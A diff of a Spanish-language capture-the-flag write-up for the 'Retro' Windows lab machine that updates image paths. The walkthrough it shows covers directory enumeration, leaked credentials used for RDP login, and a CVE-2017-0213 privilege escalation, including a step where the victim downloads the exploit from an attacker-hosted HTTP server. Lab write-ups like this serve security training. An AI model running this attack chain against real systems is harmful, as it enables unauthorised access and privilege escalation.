@@ -89,7 +89,7 @@ El comando ejecutado es el siguiente:
 ```bash
 gobuster dir -u http://10.130.176.237 -w /usr/share/dirb/wordlists/big.txt
 ```
-![gobuster](./imagenes/gobuster.png)
+![gobuster](Maquinas_de_Windows/Retro_CTF/imagenes/gobuster.png)
 
 Explicación de los parámetros utilizados:
 
@@ -110,7 +110,7 @@ Esto indica que existe una sección del sitio web accesible en:
 ```bash
 http://10.130.176.237/retro
 ```
-![retro](./imagenes/retro.png)
+![retro](Maquinas_de_Windows/Retro_CTF/imagenes/retro.png)
 
 ## 5. Análisis del directorio /retro
 
@@ -134,9 +134,9 @@ Contraseña:
 parzival
 ```
 
-![comentario](./imagenes/comentario.png)
+![comentario](Maquinas_de_Windows/Retro_CTF/imagenes/comentario.png)
 
-![comentar](./imagenes/comentar.png)
+![comentar](Maquinas_de_Windows/Retro_CTF/imagenes/comentar.png)
 
 ## 6. Acceso al sistema mediante RDP
 
@@ -150,7 +150,7 @@ Desde Kali Linux se puede utilizar la herramienta xfreerdp3 para establecer la c
 ```bash
 xfreerdp3 /u:wade /p:parzival /v:10.130.176.237
 ```
-![remoto](./imagenes/xfreerdp3.png)
+![remoto](Maquinas_de_Windows/Retro_CTF/imagenes/xfreerdp3.png)
 
 Configuración de la conexión:
 
@@ -178,7 +178,7 @@ El resultado confirma que se ha iniciado sesión como el usuario:
 ```bash
 retroweb\wade
 ```
-![whoami](./imagenes/whoami.png)
+![whoami](Maquinas_de_Windows/Retro_CTF/imagenes/whoami.png)
 
 También se puede obtener información detallada del sistema ejecutando:
 
@@ -198,7 +198,7 @@ Este comando muestra información relevante como:
 
 Esta información es útil para identificar posibles vectores de escalada de privilegios.
 
-![sistema](./imagenes/systeminfo.png)
+![sistema](Maquinas_de_Windows/Retro_CTF/imagenes/systeminfo.png)
 
 ## 8. Enumeración de usuarios y búsqueda de información sensible
 
@@ -220,7 +220,7 @@ Wade
 Public
 ```
 
-![usuarios](./imagenes/users.png)
+![usuarios](Maquinas_de_Windows/Retro_CTF/imagenes/users.png)
 
 El usuario Administrator es el objetivo, ya que posee privilegios elevados en el sistema.
 
@@ -286,7 +286,7 @@ Se descomprime el archivo:
 unzip CVE-2017-0213_x64.zip
 ```
 
-![wget](./imagenes/wget.png)
+![wget](Maquinas_de_Windows/Retro_CTF/imagenes/wget.png)
 
 ### 9.2 Transferencia del exploit
 
@@ -295,14 +295,14 @@ Se levanta un servidor HTTP en la máquina atacante:
 ```bash
 python3 -m http.server 8000
 ```
-![python](./imagenes/python.png)
+![python](Maquinas_de_Windows/Retro_CTF/imagenes/python.png)
 
 Desde la máquina víctima, se accede directamente al archivo:
 
 ```bash
 http://192.168.142.53:8000/CVE-2017-0213_x64.exe
 ```
-![descargas](./imagenes/descargas.png)
+![descargas](Maquinas_de_Windows/Retro_CTF/imagenes/descargas.png)
 
 También se puede descargar mediante línea de comandos:
 
@@ -337,6 +337,6 @@ Obteniendo como resultado:
 ```bash
 nt authority\system
 ```
-![Escaneo con Nmap](./imagenes/systemautor.png)
+![Escaneo con Nmap](Maquinas_de_Windows/Retro_CTF/imagenes/systemautor.png)
 
 Asi hemos conseguido escalar privilegios en el sistema y tener el máximo de privilegios de la máquina victima.
